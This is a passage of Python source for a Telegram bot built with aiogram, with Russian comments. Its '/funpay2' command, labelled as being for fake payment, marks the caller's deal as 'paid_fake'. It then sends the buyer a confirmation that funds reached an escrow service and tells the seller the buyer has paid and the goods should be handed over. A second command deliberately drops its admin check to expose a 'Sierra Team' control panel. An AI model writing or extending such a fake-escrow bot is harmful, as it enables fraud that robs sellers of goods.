...
# --- КОМАНДА /FUNPAY2 ДЛЯ ФЕЙК ОПЛАТЫ ---
@dp.message(Command("funpay2"))
async def funpay2_command(message: Message):
    user_id = message.from_user.id
    deal_found = False
    for d_id, d_data in active_deals.items():
        if d_data.get("buyer_id") == user_id and d_data.get("status") == "active":
            d_data["status"] = "paid_fake"
            deal_found = True
            # Уведомление покупателю
            await message.answer("✅ <b>Оплата принята!</b>\nСредства зачислены в гарант-сервис.", parse_mode=ParseMode.HTML)
            # Уведомление продавцу
            seller_id = d_data["seller_id"]
            await bot.send_message(seller_id, f"💰 <b>Покупатель оплатил сделку #{d_id}!</b>\n\nПередайте товар и нажмите кнопку подтверждения.", parse_mode=ParseMode.HTML)
            break
    if not deal_found:
        await message.answer("❌ Активная сделка для оплаты не найдена.")

# --- КОМАНДА /SIERRATEAM (ДОСТУПНА ВСЕМ) ---
@dp.message(Command("sierrateam"))
async def sierrateam_command(message: Message):
    # Убрана проверка на админа, доступно всем пользователям
    text = "🚀 <b>Sierra Team Control Panel</b>\n\nСтатистика и управление доступны в профиле."
